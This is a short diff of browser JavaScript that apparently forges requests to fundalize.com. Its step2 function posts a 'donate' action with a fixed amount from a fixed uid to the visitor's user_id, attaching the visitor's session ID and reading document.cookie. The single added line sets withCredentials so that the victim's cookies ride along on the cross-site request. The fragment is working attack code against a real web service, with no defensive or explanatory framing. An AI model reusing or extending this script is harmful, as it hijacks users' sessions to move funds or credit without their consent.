@@ -26,6 +26,7 @@ function getSID(){
 function step2(){
 	var xhttp = new XMLHttpRequest();
 	xhttp.open('POST', 'http://fundalize.com/includes/ajax_useractions.php', true);
+	xhttp.withCredentials = true;
 	var cookies = document.cookie;
 	var params = 'uid=20936&pid='+user_id+'&amount=10&session='+SID+'&message=Met%20liefde%20gegeven%20<3&mode=donate';
 	console.log('User ID: ' + user_id);
